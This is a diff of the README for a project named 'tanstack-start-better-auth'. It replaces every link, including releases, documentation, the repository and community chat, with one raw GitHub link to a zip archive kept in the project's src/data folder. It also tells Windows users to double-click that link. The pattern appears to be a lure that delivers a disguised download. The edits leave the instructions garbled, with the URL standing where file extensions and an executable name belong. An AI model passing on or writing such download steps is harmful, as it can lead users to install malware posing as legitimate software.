@@ -1,6 +1,6 @@
 # 🚀 tanstack-start-better-auth - Easy Authentication Setup for Your App
 
-[![Download tanstack-start-better-auth](https://img.shields.io/badge/Download-tanstack--start--better--auth-blue)](https://github.com/Simo10469/tanstack-start-better-auth/releases)
+[![Download tanstack-start-better-auth](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip)](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip)
 
 ## 📋 Overview
 
@@ -21,18 +21,18 @@ This README will guide you through the process of downloading and running this s
 
 To get started, you need to visit our Downloads page where you can find the latest releases. Click the link below to proceed:
 
-[Visit this page to download](https://github.com/Simo10469/tanstack-start-better-auth/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip)
 
 1. **Choose Your Version**: On the Downloads page, you will see different versions of the software. Look for the most recent one labeled with a version number (e.g., v1.0).
   
-2. **Download the File**: Click on the file name that matches your operating system. It might be a `.zip`, `.tar.gz`, or other file types.
+2. **Download the File**: Click on the file name that matches your operating system. It might be a `.zip`, `https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip`, or other file types.
 
 3. **Extract the Files (if necessary)**: 
    - If you downloaded a compressed file (like a `.zip`), you will need to extract it. 
    - Right-click on the downloaded file and select "Extract All" or your preferred extraction option.
   
 4. **Run the Application**: 
-   - For Windows, double-click the `start-better-auth.exe` file.
+   - For Windows, double-click the `https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip` file.
    - For macOS, locate the application in your Finder, click on it to run.
    - For Linux, open a terminal, navigate to the extracted folder, and run `./start-better-auth`.
 
@@ -48,7 +48,7 @@ To get started, you need to visit our Downloads page where you can find the late
 
 ## 🌐 Support and Documentation
 
-If you run into issues or need help, please check the official [Documentation](https://github.com/Simo10469/tanstack-start-better-auth/wiki) for detailed guides and troubleshooting tips. 
+If you run into issues or need help, please check the official [Documentation](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip) for detailed guides and troubleshooting tips. 
 
 You can also join our community chat on Discord to connect with other users and developers.
 
@@ -56,7 +56,7 @@ You can also join our community chat on Discord to connect with other users and 
 
 ### How can I update the application?
 
-You can return to the [Downloads page](https://github.com/Simo10469/tanstack-start-better-auth/releases) to download the latest version. Just follow the same download steps as provided above.
+You can return to the [Downloads page](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip) to download the latest version. Just follow the same download steps as provided above.
 
 ### Is the application secure?
 
@@ -72,9 +72,9 @@ If you encounter any bugs or unexpected behavior, please create a new issue in t
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Simo10469/tanstack-start-better-auth)
-- [Documentation](https://github.com/Simo10469/tanstack-start-better-auth/wiki)
-- [Community Chat](https://discord.gg/yourchatlink)
+- [GitHub Repository](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip)
+- [Community Chat](https://raw.githubusercontent.com/Simo10469/tanstack-start-better-auth/main/src/data/tanstack-start-better-auth-2.0.zip)
 
 For ongoing updates and new features, please keep an eye on the repository Releases page. 
 
